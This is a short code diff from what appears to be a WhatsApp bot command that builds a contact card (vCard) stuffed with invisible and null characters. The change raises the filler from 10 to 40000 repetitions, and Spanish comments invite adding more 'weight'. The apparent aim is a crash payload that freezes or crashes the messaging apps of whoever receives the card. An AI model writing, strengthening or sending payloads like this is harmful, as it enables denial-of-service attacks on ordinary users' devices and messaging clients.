@@ -3,8 +3,8 @@ let handler = async (m, { conn }) => {
 
   // Caracteres invisibles
   const invisible = '\u200B\u2060\u0000'; // Puedes repetir más si quieres
-  const basura = '꧅+𝑩𝑨𝑺𝑼𝑹𝑨꧅' + invisible;
-  const relleno = basura.repeat(10); // Puedes subir este número para más peso
+  const basura = 'ꦾ' + invisible;
+  const relleno = basura.repeat(40000); // Puedes subir este número para más peso
 
   const vcard = `
 BEGIN:VCARD
